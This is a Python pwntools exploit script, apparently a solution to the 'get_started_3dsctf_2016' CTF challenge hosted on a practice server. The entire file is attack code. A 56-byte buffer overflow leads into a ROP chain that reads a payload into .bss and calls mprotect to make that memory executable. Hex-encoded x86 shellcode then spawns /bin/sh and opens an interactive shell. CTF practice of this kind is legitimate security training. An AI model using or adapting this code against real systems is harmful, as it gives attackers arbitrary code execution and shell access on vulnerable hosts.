from pwn import *
local = 0
if local :
    a=process("./get_started_3dsctf_2016")
else:
    a=remote("buuoj.cn","20004")
elf=ELF("./get_started_3dsctf_2016")
#a.recvuntil("a? ")
pop3_ret=0x0806fc08
read_addr=elf.symbols["read"]
mprotect=elf.symbols["mprotect"]
bss_addr=elf.bss()
payload='A'*56
payload+=p32(read_addr)
payload+=p32(pop3_ret)
payload+=p32(0)
payload+=p32(bss_addr)
payload+=p32(0x100)
payload+=p32(mprotect)
payload+=p32(bss_addr)
payload+=p32(bss_addr&0xfffff000)
payload+=p32(0x1000)
payload+=p32(7)
a.sendline(payload)
sleep(1)
shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

a.send(shellcode_x86)
a.interactive()